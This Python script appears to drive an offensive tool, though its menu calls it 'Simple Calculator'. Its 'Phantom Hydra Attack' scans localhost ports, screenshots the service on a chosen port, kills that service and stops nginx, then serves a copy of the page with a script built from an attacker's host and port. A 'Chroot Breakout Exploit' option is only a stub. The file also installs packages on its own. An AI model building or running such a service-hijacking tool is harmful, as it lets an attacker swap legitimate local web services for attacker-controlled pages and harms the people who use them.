from server import ImageServer
from io import BytesIO
from PIL import Image
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium import webdriver
import subprocess
import sys
import socket
import os
from .process_manager import ProcessManager
# Function to install a package if not already installed


def install_if_missing(package):
    try:
        __import__(package)
    except ImportError:
        print(f"Installing {package}...")
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package])


# Ensure required packages are installed
install_if_missing("selenium")
install_if_missing("pillow")  # Pillow is imported as PIL
install_if_missing("PIL")  # Pillow is imported as PIL
install_if_missing("webdriver-manager")
install_if_missing("flask")
install_if_missing("webdriver_manager")
install_if_missing("psutil")


def _capture_host_screenshot(host="localhost", port=3000):
    # Setup Selenium WebDriver
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")  # Run in headless mode (no GUI)
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    driver = webdriver.Chrome(service=Service(
        ChromeDriverManager().install()), options=options)
    driver.get("http://{}:{}".format(host, port))

    # Capture screenshot as binary data
    screenshot = driver.get_screenshot_as_png()

    # Convert to PIL Image
    img = Image.open(BytesIO(screenshot))
    save_path = os.path.join(os.getcwd(), f"assets/screenshot_{port}.png")
    img.save(save_path)

    driver.quit()

    return save_path  # Returns a PIL Image object


def _scan_localhost_ports(start_port=1, end_port=65535):
    print("Scanning localhost for open ports...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)  # Small timeout for quick scanning
            result = s.connect_ex(("127.0.0.1", port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} is open")

    return open_ports


def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
    _scan_localhost_ports(port_start, port_end)
    port = int(input("Enter Open Port on which you want to continue: "))
    screenshotPath = _capture_host_screenshot(port=port)
    imageServer = ImageServer(
        port=port, image_path=screenshotPath, host="localhost")
    imageServer._generate_script(attack_host, attack_port)
    processManager = ProcessManager(port=port)
    processManager.kill_process_on_port()
    if (processManager.is_nginx_running()):
        processManager.stop_nginx()
        imageServer.run_server()


def chrootBreakOutExploit():
    print("I am in")


def main():
    while True:
        print("\nSimple Calculator")
        print("1. Phantom Hydra Attack 🐍👻")
        print("2. Chroot Breakout Exploit 🏴‍☠️🔓")
        print("0. Exit")

        choice = input("Select an operation (1-5): ")

        if choice == '0':
            print("Exiting calculator. Goodbye!")
            break

        if choice not in ['1', '2', '3', '4']:
            print("Invalid choice. Please select a valid option.")
            continue
        if choice == '1':
            try:
                attack_host = input("Enter Attacker's host: ")
                attack_port = input("Enter Attacker's port:")
                print("\nEnter the range of port you want to scan")
                port_1 = int(input("Enter Starting Port: "))
                port_2 = int(input("Enter Ending Port:"))
            except ValueError:
                print("Invalid input. Please enter numeric values.")
            phantomHydraAttack(port_1, port_2, attack_host, attack_port)

        elif choice == '2':
            chrootBreakOutExploit()


if __name__ == "__main__":
    main()
